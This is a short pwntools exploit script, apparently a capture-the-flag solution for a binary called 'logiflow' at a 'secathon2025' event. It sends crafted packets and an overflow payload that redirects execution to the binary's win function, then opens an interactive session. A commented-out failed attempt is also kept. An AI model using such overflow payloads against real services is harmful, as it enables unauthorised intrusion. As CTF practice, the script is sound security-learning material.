#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 35119
HOST = "secathon2025-env.net"
exe = context.binary = ELF('./logiflow-docker', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x08049767
            b* 0x080495B9
            b* handle_process_shipment+70
            b* handle_update_warehouse+213
            b* 0x0804977E
            b* process_packet+202
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = flat(
    0x4C4F4749,
    (1 | (0x100 << 16))
    )
p.send(payload)
payload = b'a'*0x100
p.send(payload)

payload = flat(
    0x4C4F4749,
    (2 | (0x200 << 16))
    )
p.send(payload)
payload = b'\x00' + p32(0)*0x47 + p32(exe.sym.win) + p64(0)*0x60
# payload = b'\x00' + p32(0x4c)*0x1a + p32(exe.sym.win) + p32(0x00021b89) + p32(0x4C4F4749)*0x20
p.send(payload)

# Da thu nhung ko thanh cong
# payload = flat(
#     0x4C4F47,
#     (3 | (0x100 << 16))
#     )
# GDB()
# p.send(payload)
# payload = b'\x04' + p64(0x4C4F4749)*0x1a
# p.send(payload)

p.interactive()